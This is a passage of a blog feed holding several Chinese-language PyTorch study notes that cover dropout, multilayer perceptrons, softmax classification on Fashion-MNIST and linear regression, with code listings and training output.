丢弃法举一个例子，\n\n\n简而言之，就是以一定概率丢弃某个隐藏层中的某个单元。不丢弃的单元要除以（1-p）。\n丢弃法从零开始的实现1234567%matplotlib inlineimport torchimport torch.nn as nnimport numpy as npimport syssys.path.append(\"/home/kesci/input\")import d2lzh1981 as d2l\n\n12345678910def dropout(X, drop_prob):    X = X.float()    assert 0 &lt;= drop_prob &lt;= 1\t#判断丢弃率是否在0-1之间    keep_prob = 1 - drop_prob    # 这种情况下把全部元素都丢弃    if keep_prob == 0:        return torch.zeros_like(X)    mask = (torch.rand(X.shape) &lt; keep_prob).float()        return mask * X / keep_prob\n\nmask = (torch.rand(X.shape) &lt; keep_prob).float()：先随机生成一个与 X 形状相同的矩阵，里面的元素小于keep_prob的要保留，即把这个值制1，大于keep_prob的要丢弃，这个位置就为填0.mask * X / keep_prob：把这个含01的矩阵mask与X相乘，矩阵X的某些位置变成了0，不为0的位置除以keep_prob拉伸。12X = torch.arange(16).view(2, 8)\t# 定义Xdropout(X, 0)\t#不丢弃\n\n123输出：tensor([[ 0.,  1.,  2.,  3.,  4.,  5.,  6.,  7.],        [ 8.,  9., 10., 11., 12., 13., 14., 15.]])\n\n1dropout(X, 0.5)\n\n123输出：tensor([[ 0.,  0.,  0.,  6.,  8., 10.,  0., 14.],        [ 0.,  0., 20.,  0.,  0.,  0., 28.,  0.]])\n\n1dropout(X, 1.0)\n\n12tensor([[0., 0., 0., 0., 0., 0., 0., 0.],        [0., 0., 0., 0., 0., 0., 0., 0.]])\n\n1234567891011# 参数的初始化num_inputs, num_outputs, num_hiddens1, num_hiddens2 = 784, 10, 256, 256W1 = torch.tensor(np.random.normal(0, 0.01, size=(num_inputs, num_hiddens1)), dtype=torch.float, requires_grad=True)b1 = torch.zeros(num_hiddens1, requires_grad=True)W2 = torch.tensor(np.random.normal(0, 0.01, size=(num_hiddens1, num_hiddens2)), dtype=torch.float, requires_grad=True)b2 = torch.zeros(num_hiddens2, requires_grad=True)W3 = torch.tensor(np.random.normal(0, 0.01, size=(num_hiddens2, num_outputs)), dtype=torch.float, requires_grad=True)b3 = torch.zeros(num_outputs, requires_grad=True)params = [W1, b1, W2, b2, W3, b3]\n\n1234567891011drop_prob1, drop_prob2 = 0.2, 0.5\t#有两个隐藏层def net(X, is_training=True):    X = X.view(-1, num_inputs)    H1 = (torch.matmul(X, W1) + b1).relu()    if is_training:  # 只在训练模型时使用丢弃法        H1 = dropout(H1, drop_prob1)  # 在第一层全连接后添加丢弃层    H2 = (torch.matmul(H1, W2) + b2).relu()    if is_training:        H2 = dropout(H2, drop_prob2)  # 在第二层全连接后添加丢弃层    return torch.matmul(H2, W3) + b3\n\nis_training=True：训练时需要丢弃，测试时不需要丢弃。123456789101112131415def evaluate_accuracy(data_iter, net):    acc_sum, n = 0.0, 0    for X, y in data_iter:        if isinstance(net, torch.nn.Module):            net.eval() # 评估模式, 这会关闭dropout            acc_sum += (net(X).argmax(dim=1) == y).float().sum().item()            net.train() # 改回训练模式        else: # 自定义的模型            if('is_training' in net.__code__.co_varnames): # 如果有is_training这个参数                # 将is_training设置成False                acc_sum += (net(X, is_training=False).argmax(dim=1) == y).float().sum().item()             else:                acc_sum += (net(X).argmax(dim=1) == y).float().sum().item()         n += y.shape[0]    return acc_sum / n\n\n先判断这个net是否是torch.nn.Module，是的话就使用net.eval() 评估模式，关闭dropout丢弃法。123456789101112num_epochs, lr, batch_size = 5, 100.0, 256  # 这里的学习率设置的很大，原因与之前相同。loss = torch.nn.CrossEntropyLoss()train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, root='/home/kesci/input/FashionMNIST2065')d2l.train_ch3(    net,    train_iter,    test_iter,    loss,    num_epochs,    batch_size,    params,    lr)\n\n12345epoch 1, loss 0.0046, train acc 0.541, test acc 0.656epoch 2, loss 0.0023, train acc 0.783, test acc 0.784epoch 3, loss 0.0019, train acc 0.821, test acc 0.760epoch 4, loss 0.0017, train acc 0.838, test acc 0.832epoch 5, loss 0.0016, train acc 0.849, test acc 0.836\n\n简洁实现：12345678910111213net = nn.Sequential(        d2l.FlattenLayer(),\t#改输入格式        nn.Linear(num_inputs, num_hiddens1),\t#隐藏层        nn.ReLU(),\t#激活函数        nn.Dropout(drop_prob1),\t#丢弃法        nn.Linear(num_hiddens1, num_hiddens2),         nn.ReLU(),        nn.Dropout(drop_prob2),        nn.Linear(num_hiddens2, 10)        )for param in net.parameters():    nn.init.normal_(param, mean=0, std=0.01)\t#初始化参数\n\n12optimizer = torch.optim.SGD(net.parameters(), lr=0.5)\t#优化网络中的参数d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, batch_size, None, None, optimizer)\n\n12345epoch 1, loss 0.0045, train acc 0.550, test acc 0.739epoch 2, loss 0.0023, train acc 0.783, test acc 0.746epoch 3, loss 0.0019, train acc 0.819, test acc 0.727epoch 4, loss 0.0018, train acc 0.831, test acc 0.806epoch 5, loss 0.0016, train acc 0.847, test acc 0.787\n\n","thumbnail":"https://i.loli.net/2020/02/14/1LWrEJvD8koPMnB.jpg","plink":"https://yuyuoo.github.io/2020/02/14/pytorch笔记四：过拟合欠拟合及其解决方案/"},{"title":"pytorch笔记三：多层感知机","date":"2020-02-14T06:08:00.000Z","date_formatted":{"ll":"Feb 14, 2020","L":"02/14/2020","MM-DD":"02-14"},"updated":"2020-03-07T06:40:41.480Z","content":"简单的添加隐藏层仍然等价于一个单层神经网络，只不过式子复杂一些，比如\n\n激活函数为了解决这个问题，引入非线性变换，例如对隐藏变量使用按元素运算的非线性函数进行变换，然后再作为下一个全连接层的输入。这个非线性函数被称为激活函数（activation function）。\n下面介绍几个常用的激活函数：\nReLU函数ReLU（rectified linear unit）函数提供了一个很简单的非线性变换。给定元素x，该函数定义为\nReLU(x)=max(x,0). 也就是只保留正数元素，并将负数元素清零。\n\nSigmoid函数sigmoid函数可以将元素的值变换到0和1之间：\n\ntanh函数tanh（双曲正切）函数可以将元素的值变换到-1和1之间：\n\n关于激活函数的选择ReLu函数是一个通用的激活函数，目前在大多数情况下使用。但是，ReLU函数只能在隐藏层中使用。\n用于分类器时，sigmoid函数及其组合通常效果更好。由于梯度消失问题，有时要避免使用sigmoid和tanh函数。\n在神经网络层数较多的时候，最好使用ReLu函数，ReLu函数比较简单计算量少，而sigmoid和tanh函数计算量大很多。\n在选择激活函数的时候可以先选用ReLu函数如果效果不理想可以尝试其他激活函数。\n1. 多层感知机从零开始的实现12345import torchimport numpy as npimport syssys.path.append(\"/home/kesci/input\")import d2lzh1981 as d2l\n\n获取训练集12batch_size = 256train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size,root='/home/kesci/input/FashionMNIST2065')\n\n定义模型参数1234567891011num_inputs, num_outputs, num_hiddens = 784, 10, 256#两层网络，初始化4个参数W1 = torch.tensor(np.random.normal(0, 0.01, (num_inputs, num_hiddens)), dtype=torch.float)b1 = torch.zeros(num_hiddens, dtype=torch.float)W2 = torch.tensor(np.random.normal(0, 0.01, (num_hiddens, num_outputs)), dtype=torch.float)b2 = torch.zeros(num_outputs, dtype=torch.float)params = [W1, b1, W2, b2]for param in params:    param.requires_grad_(requires_grad=True)\t#附加梯度\n\nnum_hiddens 是隐藏层输出的个数定义激活函数12def relu(X):    return torch.max(input=X, other=torch.tensor(0.0))\n\n定义网络1234def net(X):    X = X.view((-1, num_inputs))    H = relu(torch.matmul(X, W1) + b1)    return torch.matmul(H, W2) + b2\n\n矩阵相乘有 torch.mm 和 torch.matmul 两个函数。其中前一个是针对二维矩阵，后一个是高维。当 torch.mm 用于大于二维时将报错。定义损失函数1loss = torch.nn.CrossEntropyLoss()\n\n训练12345678910111213141516171819202122232425262728293031num_epochs, lr = 5, 100.0# def train_ch3(net, train_iter, test_iter, loss, num_epochs, batch_size,#               params=None, lr=None, optimizer=None):#     for epoch in range(num_epochs):#         train_l_sum, train_acc_sum, n = 0.0, 0.0, 0#         for X, y in train_iter:#             y_hat = net(X)#             l = loss(y_hat, y).sum()#             #             # 梯度清零#             if optimizer is not None:#                 optimizer.zero_grad()#             elif params is not None and params[0].grad is not None:#                 for param in params:#                     param.grad.data.zero_()#            #             l.backward()#             if optimizer is None:#                 d2l.sgd(params, lr, batch_size)#             else:#                 optimizer.step()  # “softmax回归的简洁实现”一节将用到#             #             #             train_l_sum += l.item()#             train_acc_sum += (y_hat.argmax(dim=1) == y).sum().item()#             n += y.shape[0]#         test_acc = evaluate_accuracy(test_iter, net)#         print('epoch %d, loss %.4f, train acc %.3f, test acc %.3f'#               % (epoch + 1, train_l_sum / n, train_acc_sum / n, test_acc))d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, batch_size, params, lr)\n\n12345epoch 1, loss 0.0030, train acc 0.712, test acc 0.806epoch 2, loss 0.0019, train acc 0.821, test acc 0.806epoch 3, loss 0.0017, train acc 0.847, test acc 0.825epoch 4, loss 0.0015, train acc 0.856, test acc 0.834epoch 5, loss 0.0015, train acc 0.863, test acc 0.847\n\n2. 多层感知机pytorch实现1234567import torchfrom torch import nnfrom torch.nn import initimport numpy as npimport syssys.path.append(\"/home/kesci/input\")import d2lzh1981 as d2l\n\n初始化模型和各个参数1234567891011num_inputs, num_outputs, num_hiddens = 784, 10, 256    net = nn.Sequential(        d2l.FlattenLayer(),\t#把X的28*28转换成784        nn.Linear(num_inputs, num_hiddens),        nn.ReLU(),        nn.Linear(num_hiddens, num_outputs),         )    for params in net.parameters():    init.normal_(params, mean=0, std=0.01)\n\n训练12345678batch_size = 256train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size,root='/home/kesci/input/FashionMNIST2065')loss = torch.nn.CrossEntropyLoss()optimizer = torch.optim.SGD(net.parameters(), lr=0.5)num_epochs = 5d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, batch_size, None, None, optimizer)\n\n12345epoch 1, loss 0.0031, train acc 0.701, test acc 0.774epoch 2, loss 0.0019, train acc 0.821, test acc 0.806epoch 3, loss 0.0017, train acc 0.841, test acc 0.805epoch 4, loss 0.0015, train acc 0.855, test acc 0.834epoch 5, loss 0.0014, train acc 0.866, test acc 0.840\n\n","thumbnail":"https://i.loli.net/2020/02/14/liZIcysfJVmzDv8.jpg","plink":"https://yuyuoo.github.io/2020/02/14/pytorch笔记三：多层感知机/"},{"title":"pytorch笔记二：Softmax与分类模型","date":"2020-02-13T15:58:37.000Z","date_formatted":{"ll":"Feb 13, 2020","L":"02/13/2020","MM-DD":"02-13"},"updated":"2020-03-07T06:40:31.531Z","content":"Softmax是对离散数据分类，这里的例子是图像分类。\n使用softmax运算符，使得输出的几个值都为正数且和为1，把预测概率最大的类别作为输出类别。\n使用交叉熵损失函数。\n1. 获取Fashion-MNIST训练集和读取数据这里我们会使用torchvision包，它是服务于PyTorch深度学习框架的，主要用来构建计算机视觉模型。torchvision主要由以下几部分构成：\ntorchvision.datasets: 一些加载数据的函数及常用的数据集接口；torchvision.models: 包含常用的模型结构（含预训练模型），例如AlexNet、VGG、ResNet等；torchvision.transforms: 常用的图片变换，例如裁剪、旋转等；torchvision.utils: 其他的一些有用的方法。12345678910111213# import needed package%matplotlib inlinefrom IPython import displayimport matplotlib.pyplot as pltimport torchimport torchvisionimport torchvision.transforms as transformsimport timeimport syssys.path.append(\"/home/kesci/input\")import d2lzh1981 as d2l\n\nget dataset12mnist_train = torchvision.datasets.FashionMNIST(root='/home/kesci/input/FashionMNIST2065', train=True, download=True, transform=transforms.ToTensor())mnist_test = torchvision.datasets.FashionMNIST(root='/home/kesci/input/FashionMNIST2065', train=False, download=True, transform=transforms.ToTensor())\n\nclass torchvision.datasets.FashionMNIST(root, train=True, transform=None, target_transform=None, download=False)\nroot（string）– 数据集的根目录，其中存放processed/training.pt和processed/test.pt文件。train（bool, 可选）– 如果设置为True，从training.pt创建数据集，否则从test.pt创建。download（bool, 可选）– 如果设置为True，从互联网下载数据并放到root文件夹下。如果root目录下已经存在数据，不会再次下载。transform（可被调用 , 可选）– 一种函数或变换，输入PIL图片，返回变换之后的数据。如：transforms.RandomCrop。target_transform（可被调用 , 可选）– 一种函数或变换，输入目标，进行变换。看一下下载到的数据：\n123# show result print(type(mnist_train))\t#&lt;class 'torchvision.datasets.mnist.FashionMNIST'&gt;print(len(mnist_train), len(mnist_test))\t#60000 10000\n\n通过下标来访问任意一个样本，如feature, label = mnist_train[0]\n12345# 本函数已保存在d2lzh包中方便以后使用，把标签转为文本信息def get_fashion_mnist_labels(labels):    text_labels = ['t-shirt', 'trouser', 'pullover', 'dress', 'coat',                   'sandal', 'shirt', 'sneaker', 'bag', 'ankle boot']    return [text_labels[int(i)] for i in labels]\n\n12345678910def show_fashion_mnist(images, labels):    d2l.use_svg_display()    # 这里的_表示我们忽略（不使用）的变量    _, figs = plt.subplots(1, len(images), figsize=(12, 12))    for f, img, lbl in zip(figs, images, labels):        f.imshow(img.view((28, 28)).numpy())        f.set_title(lbl)        f.axes.get_xaxis().set_visible(False)        f.axes.get_yaxis().set_visible(False)    plt.show()\n\n下面做数据集的展示\n12345X, y = [], []for i in range(10):    X.append(mnist_train[i][0]) # 将第i个feature加到X中    y.append(mnist_train[i][1]) # 将第i个label加到y中show_fashion_mnist(X, get_fashion_mnist_labels(y))\n\n\n12345# 读取数据batch_size = 256num_workers = 4\t#工作线程train_iter = torch.utils.data.DataLoader(mnist_train, batch_size=batch_size, shuffle=True, num_workers=num_workers)test_iter = torch.utils.data.DataLoader(mnist_test, batch_size=batch_size, shuffle=False, num_workers=num_workers)\n\n2. softmax从零开始的实现123456import torchimport torchvisionimport numpy as npimport sys\t#是为了加载下面d2lzh1981模块sys.path.append(\"/home/kesci/input\")import d2lzh1981 as d2l\n\n12batch_size = 256train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, root='/home/kesci/input/FashionMNIST2065')\n\n模型参数初始化12345num_inputs = 784\t#图像像素是28*28num_outputs = 10\t#输出是10种类别W = torch.tensor(np.random.normal(0, 0.01, (num_inputs, num_outputs)), dtype=torch.float)b = torch.zeros(num_outputs, dtype=torch.float)\n\n给权重和偏差附加梯度，方便后面反向传播\n12W.requires_grad_(requires_grad=True)b.requires_grad_(requires_grad=True)\n\n对多维Tensor按维度操作举例12345X = torch.tensor([[1, 2, 3], [4, 5, 6]])print(X.sum(dim=0, keepdim=True))  # dim为0，按照相同的列求和，并在结果中保留列特征print(X.sum(dim=1, keepdim=True))  # dim为1，按照相同的行求和，并在结果中保留行特征print(X.sum(dim=0, keepdim=False)) # dim为0，按照相同的列求和，不在结果中保留列特征print(X.sum(dim=1, keepdim=False)) # dim为1，按照相同的行求和，不在结果中保留行特征\n\n输出：\n12345tensor([[5, 7, 9]])tensor([[ 6],        [15]])\t#依然是两行tensor([5, 7, 9])tensor([ 6, 15])\t#这里不是两行了\n\n定义softmax操作\n123456def softmax(X):    X_exp = X.exp()\t#求X的指数    partition = X_exp.sum(dim=1, keepdim=True)\t#指数求和    # print(\"X size is \", X_exp.size())    # print(\"partition size is \", partition, partition.size())    return X_exp / partition  # 这里应用了广播机制\n\nsoftmax回归模型\n12def net(X):    return softmax(torch.mm(X.view((-1, num_inputs)), W) + b)\n\nX.view使 X 变形，才能与 W 相乘。 W 是784*10定义损失函数\n把第一个式子代入第二个，得到第三个。第三个式子是最后要应用的公式。\n123y_hat = torch.tensor([[0.1, 0.3, 0.6], [0.3, 0.2, 0.5]])y = torch.LongTensor([0, 2])y_hat.gather(1, y.view(-1, 1))\n\ngather()取数据，第一个参数1是 dimension，表示按行取；第二个参数把 y 变成2行1列的tensor，那么就要到 y_hat 中第一行取第0个，第二行取第2个。取出0.1和0.5。交叉熵损失函数：\n12def cross_entropy(y_hat, y):    return - torch.log(y_hat.gather(1, y.view(-1, 1)))\n\ny_hat 是 y 的估计，从中按 y 的数字取。定义准确率12def accuracy(y_hat, y):    return (y_hat.argmax(dim=1) == y).float().mean().item()\n\n取 y_hat 的最大的一个值，比较是否和真实值 y 相等，相等就为1，否则为0。把这些1和0取平均值，得到准确率。1234567# 本函数已保存在d2lzh_pytorch包中方便以后使用。该函数将被逐步改进：它的完整实现将在“图像增广”一节中描述def evaluate_accuracy(data_iter, net):    acc_sum, n = 0.0, 0    for X, y in data_iter:        acc_sum += (net(X).argmax(dim=1) == y).float().sum().item()        n += y.shape[0]    return acc_sum / n\n\n所有的准确率累加，除以样本数。训练模型123456789101112131415161718192021222324252627282930313233num_epochs, lr = 5, 0.1# 本函数已保存在d2lzh_pytorch包中方便以后使用def train_ch3(net, train_iter, test_iter, loss, num_epochs, batch_size,              params=None, lr=None, optimizer=None):    for epoch in range(num_epochs):        train_l_sum, train_acc_sum, n = 0.0, 0.0, 0        for X, y in train_iter:            y_hat = net(X)            l = loss(y_hat, y).sum()                        # 梯度清零            if optimizer is not None:                optimizer.zero_grad()            elif params is not None and params[0].grad is not None:                for param in params:                    param.grad.data.zero_()                        l.backward()            if optimizer is None:                d2l.sgd(params, lr, batch_size)            else:                optimizer.step()                                     train_l_sum += l.item()            train_acc_sum += (y_hat.argmax(dim=1) == y).sum().item()            n += y.shape[0]        test_acc = evaluate_accuracy(test_iter, net)        print('epoch %d, loss %.4f, train acc %.3f, test acc %.3f'              % (epoch + 1, train_l_sum / n, train_acc_sum / n, test_acc))train_ch3(net, train_iter, test_iter, cross_entropy, num_epochs, batch_size, [W, b], lr)\n\n输出：\n12345epoch 1, loss 0.7851, train acc 0.750, test acc 0.791epoch 2, loss 0.5704, train acc 0.814, test acc 0.810epoch 3, loss 0.5258, train acc 0.825, test acc 0.819epoch 4, loss 0.5014, train acc 0.832, test acc 0.824epoch 5, loss 0.4865, train acc 0.836, test acc 0.827\n\noptimizer是可选的，有 optimizer 时很多操作都省了。模型预测1234567X, y &#x3D; iter(test_iter).next()true_labels &#x3D; d2l.get_fashion_mnist_labels(y.numpy())pred_labels &#x3D; d2l.get_fashion_mnist_labels(net(X).argmax(dim&#x3D;1).numpy())titles &#x3D; [true + &#39;\\n&#39; + pred for true, pred in zip(true_labels, pred_labels)]d2l.show_fashion_mnist(X[0:9], titles[0:9])\n\n\n3. softmax的简洁实现12345678# 加载各种包或者模块import torchfrom torch import nnfrom torch.nn import initimport numpy as npimport syssys.path.append(\"/home/kesci/input\")import d2lzh1981 as d2l\n\n初始化参数和获取数据12batch_size = 256train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, root='/home/kesci/input/FashionMNIST2065')\n\n定义网络模型123456789101112131415161718192021222324252627num_inputs = 784num_outputs = 10class LinearNet(nn.Module):    def __init__(self, num_inputs, num_outputs):        super(LinearNet, self).__init__()        self.linear = nn.Linear(num_inputs, num_outputs)    def forward(self, x): # x 的形状: (batch, 1, 28, 28)        y = self.linear(x.view(x.shape[0], -1))        return y    # net = LinearNet(num_inputs, num_outputs)class FlattenLayer(nn.Module):    def __init__(self):        super(FlattenLayer, self).__init__()    def forward(self, x): # x 的形状: (batch, *, *, ...)        return x.view(x.shape[0], -1)from collections import OrderedDictnet = nn.Sequential(        # FlattenLayer(),        # LinearNet(num_inputs, num_outputs)         OrderedDict([           ('flatten', FlattenLayer()),           ('linear', nn.Linear(num_inputs, num_outputs))]) # 或者写成我们自己定义的 LinearNet(num_inputs, num_outputs) 也可以        )\n\n有两个层，第一个层是转换 x 的形状，第二个层是线性层。初始化模型参数12init.normal_(net.linear.weight, mean=0, std=0.01)init.constant_(net.linear.bias, val=0)\n\n定义损失函数12loss = nn.CrossEntropyLoss() # 下面是他的函数原型# class torch.nn.CrossEntropyLoss(weight=None, size_average=None, ignore_index=-100, reduce=None, reduction='mean')\n\n定义优化函数12optimizer = torch.optim.SGD(net.parameters(), lr=0.1) # 下面是函数原型# class torch.optim.SGD(params, lr=, momentum=0, dampening=0, weight_decay=0, nesterov=False)\n\n构建好神经网络后，网络的参数都保存在 parameters () 函数当中训练12num_epochs = 5d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, batch_size, None, None, optimizer)\n\n12345epoch 1, loss 0.0031, train acc 0.751, test acc 0.795epoch 2, loss 0.0022, train acc 0.813, test acc 0.809epoch 3, loss 0.0021, train acc 0.825, test acc 0.806epoch 4, loss 0.0020, train acc 0.833, test acc 0.813epoch 5, loss 0.0019, train acc 0.837, test acc 0.822\n\n在刚开始训练时，训练数据集上的准确率低于测试数据集上的准确率，原因是：\n训练集上的准确率是在一个 epoch 的过程中计算得到的，测试集上的准确率是在一个 epoch 结束后计算得到的，后者的模型参数更优。\n","thumbnail":"https://i.loli.net/2020/02/14/XAa7gmMFTe1JlLn.png","plink":"https://yuyuoo.github.io/2020/02/13/pytorch笔记二：Softmax与分类模型/"},{"title":"pytorch笔记一：线性回归","date":"2020-02-13T07:24:54.000Z","date_formatted":{"ll":"Feb 13, 2020","L":"02/13/2020","MM-DD":"02-13"},"updated":"2020-03-07T06:40:20.213Z","content":"\n资料链接：https://github.com/ShusenTang/Dive-into-DL-PyTorch/blob/master/docs/chapter03_DL-basics/3.1_linear-regression.md\n\n在开始线性回归之前还是先看一下基本数据操作。\n数据操作1. 创建Tensor12345678910import torch#(1) 创建一个 5x3 的未初始化的 Tensorx = torch.empty(5,3)#(2) 创建一个 5x3 的随机初始化的 Tensorx = torch.rand(5, 3)#(3) 创建一个 5x3 的 long 型全 0 的 Tensorx = torch.zeros(5, 3, dtype=torch.long)#(4) 直接根据数据创建x = torch.tensor([5.5,3])\n\n还可以通过现有的 Tensor 来创建，此方法会默认重用输入 Tensor 的一些属性，例如数据类型，除非自定义数据类型。\n123456x = torch.tensor([5, 3])x = x.new_ones(5, 3)  # 返回的tensor默认具有相同的torch.dtype和torch.deviceprint(x)x = torch.ones_like(x, dtype=torch.float) # 指定新的数据类型print(x)\n\n输出：\n12345678910tensor([[1, 1, 1],        [1, 1, 1],        [1, 1, 1],        [1, 1, 1],        [1, 1, 1]])tensor([[1., 1., 1.],        [1., 1., 1.],        [1., 1., 1.],        [1., 1., 1.],        [1., 1., 1.]])\n\n12print(x.size())print(x.shape) #获取 Tensor 的形状\n\n2. 算术操作12345678910111213x = torch.rand(5,3)y = torch.rand(5,3)#加法形式一print(x+y)#加法形式二print(torch.add(x, y))\t#可指定result    result = torch.empty(5,3)    torch.add(x,y,out=result)    print(result)#加法形式三y.add_(x)print(y)\n\n3. 改变形状1234#用 view() 来改变 Tensor 的形状：x = torch.rand(5,3)y = x.view(15)\t#y是1*15z = x.view(-1, 5)  # -1所指的维度可以根据其他维度的值推出来，z是3*5\n\n注意 view() 返回的新 Tensor 与源 Tensor 虽然可能有不同的 size，但是是共享 data 的，也即现在更改x的值，y也会跟着改变。\n所以如果我们想返回一个真正新的副本（即不共享 data 内存），推荐先用 clone 创造一个副本然后再使用 view。\n12x_cp = x.clone().view(15)x -= 1\t#x的元素值减1，x_cp不变\n\n使用 clone 还有一个好处是会被记录在计算图中，即梯度回传到副本时也会传到源 Tensor。\n1234#iter()函数将一个标量 Tensor 转换成一个 Python numberx = torch.randn(1)print(x)\t#输出tensor([2.3466])print(x.item())\t#输出2.3466382026672363\n\n4. 广播机制https://pytorch.org/docs/stable/notes/broadcasting.html\n当对两个形状不同的 Tensor 按元素运算时，可能会触发广播（broadcasting）机制：先适当复制元素使这两个 Tensor 形状相同后再按元素运算。\n5. Tensor 和 NumPy 相互转换12345678910# 使用 numpy() 将 Tensor 转换成 NumPy 数组# 产生的 Tensor 和 NumPy 中的数组共享相同的内存,改变其中一个时另一个也会改变a = torch.ones(5)b = a.numpy()print(a, b)\t# tensor([1., 1., 1., 1., 1.]) [1. 1. 1. 1. 1.]a += 1print(a, b)\t# tensor([2., 2., 2., 2., 2.]) [2. 2. 2. 2. 2.]b += 1print(a, b)\t# tensor([3., 3., 3., 3., 3.]) [3. 3. 3. 3. 3.]\n\n12345678910# 使用 from_numpy() 将 NumPy 数组转换成 Tensorimport numpy as npa = np.ones(5)b = torch.from_numpy(a)print(a, b)\t# [1. 1. 1. 1. 1.] tensor([1., 1., 1., 1., 1.], dtype=torch.float64)a += 1print(a, b)\t# [2. 2. 2. 2. 2.] tensor([2., 2., 2., 2., 2.], dtype=torch.float64)b += 1print(a, b)\t# [3. 3. 3. 3. 3.] tensor([3., 3., 3., 3., 3.], dtype=torch.float64)\n\n1234# 不共享内存c = torch.tensor(a)a += 1print(a, c)\t# [4. 4. 4. 4. 4.] tensor([3., 3., 3., 3., 3.], dtype=torch.float64)\n\n6. Tensor on GPU123456789# 用方法 to() 可以将 Tensor 在 CPU 和 GPU（需要硬件支持）之间相互移动# 以下代码只有在PyTorch GPU版本上才会执行if torch.cuda.is_available():    device = torch.device(\"cuda\")          # GPU    y = torch.ones_like(x, device=device)  # 直接创建一个在GPU上的Tensor    x = x.to(device)                       # 等价于 .to(\"cuda\")    z = x + y    print(z)    print(z.to(\"cpu\", torch.double))       # to()还可以同时更改数据类型\n\n线性回归1. 线性回归的基本要素模型这里的例子是房屋价格预测，只考虑面积（平方米）和房龄（年）。接下来我们希望探索价格与这两个因素的具体关系。线性回归假设输出与各个输入之间是线性关系：\n\n数据集我们通常收集一系列的真实数据，例如多栋房屋的真实售出价格和它们对应的面积和房龄。我们希望在这个数据上面寻找模型参数来使模型的预测价格与真实价格的误差最小。在机器学习术语里，该数据集被称为训练数据集（training data set）或训练集（training set），一栋房屋被称为一个样本（sample），其真实售出价格叫作标签（label），用来预测标签的两个因素叫作特征（feature）。特征用来表征样本的特点。\n损失函数在模型训练中，我们需要衡量价格预测值与真实值之间的误差。通常我们会选取一个非负数作为误差，且数值越小表示误差越小。一个常用的选择是平方函数。 它在评估索引为 i 的样本误差的表达式为\n\n优化函数 - 随机梯度下降这里采用小批量随机梯度下降。\n2. 线性回归模型从零开始的实现1234567# import packages and modules%matplotlib inlineimport torchfrom IPython import displayfrom matplotlib import pyplot as pltimport numpy as npimport random\n\n生成数据集1234567891011121314num_inputs = 2# set example numbernum_examples = 1000# set true weight and bias in order to generate corresponded labeltrue_w = [2, -3.4]true_b = 4.2features = torch.randn(num_examples, num_inputs,                      dtype=torch.float32)\t#1000行，2列labels = true_w[0] * features[:, 0] + true_w[1] * features[:, 1] + true_b#为了使生成的数据集不完全符合上面的线性分布，加一个正态分布随机生成的偏差labels += torch.tensor(np.random.normal(0, 0.01, size=labels.size()),                       dtype=torch.float32)\n\n读取数据集1234567def data_iter(batch_size, features, labels):    num_examples = len(features)    indices = list(range(num_examples))    random.shuffle(indices)  # random read 10 samples    for i in range(0, num_examples, batch_size):        j = torch.LongTensor(indices[i: min(i + batch_size, num_examples)]) # the last time may be not enough for a whole batch        yield  features.index_select(0, j), labels.index_select(0, j)\n\n代码解释：\nfeatures是 1000*2 的张量，num_examples = len(features)是 1000，indices = list(range(num_examples))是0到999的一个list，random.shuffle(indices)把这1000个数打乱。这样后面取的时候就不会有序。for循环次数取决于 batch_size 步长，每次从 indices[] 中取从 i 到 i + batch_size 序号的数，为了防止最后一次取超出了1000，所以加了min(i + batch_size, num_examples)。torch.LongTensor 是CPU tensor的有符号64位int。更多数据类型参考https://www.jianshu.com/p/45a8579628c4index_select(0, j)：从第0维挑选数据，从 j 中的位置挑选数据，j 中有是十个数字，也就是从 features 这10行挑选。可以看一下第一轮挑选出的数据：\n12345batch_size = 10for X, y in data_iter(batch_size, features, labels):    print(X, '\\n', y)    break\n\n运行结果：\n123456789101112tensor([[-0.2732,  0.9252],        [ 2.3337, -0.2072],        [-0.4872, -0.4645],        [-0.0217,  1.3339],        [-0.7408,  0.0728],        [ 1.7020, -0.5601],        [ 0.0830,  0.7293],        [-0.4804, -1.0335],        [-1.3484, -1.5484],        [ 0.1082, -0.2896]])  tensor([ 0.4939,  9.5747,  4.8044, -0.3721,  2.4826,  9.5104,  1.8949,  6.7509,         6.7622,  5.4117])\n\n初始化模型参数123456#随机正态分布w = torch.tensor(np.random.normal(0, 0.01, (num_inputs, 1)), dtype=torch.float32)b = torch.zeros(1, dtype=torch.float32)w.requires_grad_(requires_grad=True)b.requires_grad_(requires_grad=True)\n\n代码解释：\nnumpy.random.normal(0, 0.01, (num_inputs, 1))括号中第一个是loc，是概率分布的均值，第二个是scale，是概率分布的标准差，第三个是size。requires_grad_()：给参数附加梯度，因为后面要用到参数的梯度。定义模型12def linreg(X, w, b):    return torch.mm(X, w) + b\n\n代码解释：\ntorch.mm(a, b) 是矩阵 a 和 b 矩阵相乘，比如 a 的维度是 (1, 2)，b 的维度是 (2, 3)，返回的就是 (1, 3) 的矩阵定义损失函数使用的是均方误差损失函数：\n12def squared_loss(y_hat, y):     return (y_hat - y.view(y_hat.size())) ** 2 / 2\n\n定义优化函数使用的是小批量随机梯度下降\n123def sgd(params, lr, batch_size):     for param in params:        param.data -= lr * param.grad / batch_size # ues .data to operate param without gradient track对参数优化的动作不希望被附加\n\n训练123456789101112131415161718192021222324252627282930# super parameters initlr = 0.03\t#学习率num_epochs = 5\t#训练的周期net = linregloss = squared_loss# trainingfor epoch in range(num_epochs):  # training repeats num_epochs times    # in each epoch, all the samples in dataset will be used once        # X is the feature and y is the label of a batch sample    for X, y in data_iter(batch_size, features, labels):        l = loss(net(X, w, b), y).sum()          # calculate the gradient of batch sample loss 反向传播求梯度        l.backward()        # using small batch random gradient descent to iter model parameters        sgd([w, b], lr, batch_size)          # reset parameter gradient参数梯度要清零        w.grad.data.zero_()        b.grad.data.zero_()    train_l = loss(net(features, w, b), labels)    print('epoch %d, loss %f' % (epoch + 1, train_l.mean().item()))    #输出：epoch 1, loss 0.032129epoch 2, loss 0.000109epoch 3, loss 0.000048epoch 4, loss 0.000048epoch 5, loss 0.000048\n\n看一下训练得到的值和真实值的差距：\n12345678w, true_w, b, true_b#输出：(tensor([[ 2.0005],         [-3.3995]], requires_grad=True), [2, -3.4], tensor([4.2005], requires_grad=True), 4.2)\n\n3. 